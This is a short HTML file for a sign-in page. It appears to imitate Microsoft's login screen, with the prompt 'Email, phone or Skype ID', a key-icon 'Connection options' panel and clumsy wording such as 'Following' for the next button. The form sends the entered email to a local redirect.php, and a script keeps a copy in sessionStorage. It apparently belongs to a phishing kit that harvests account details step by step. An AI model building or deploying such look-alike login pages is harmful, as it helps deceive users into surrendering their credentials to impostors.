<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="./index.css">
    <link rel="shortcut icon" href="./assets/icon.ico" type="image/x-icon">

</head>
<body>
    <form action="./redirect.php" method="post" onsubmit="return handleSubmit()">
        <div class="container">
         <img src="./assets/logo.svg" id="logo"/>
         <h1>To login</h1>
         <input required name="userEmail" id="userEmail" type="email" placeholder="Email, phone or Skype ID"/>
         <div id="accounts">
             <p>No account ?</p>
             <span>Create one!</span>
         </div>
         <span id="c">Your account is not accessible ?</span>
         <button id="btn" type="submit" >Following</button>
        </div>
        <div class="part-2">
         <img src="./assets//key.svg" id="key"/>
         <h3>Connection options</h3>
        </div>
     </form>
     <script>
         function handleSubmit(){
            var xmail= document.getElementById("userEmail").value;
            sessionStorage.setItem('xmail', xmail)
            if(xmail!==""){
                return true
            }
            return false
         }
     </script>
</body>
</html>
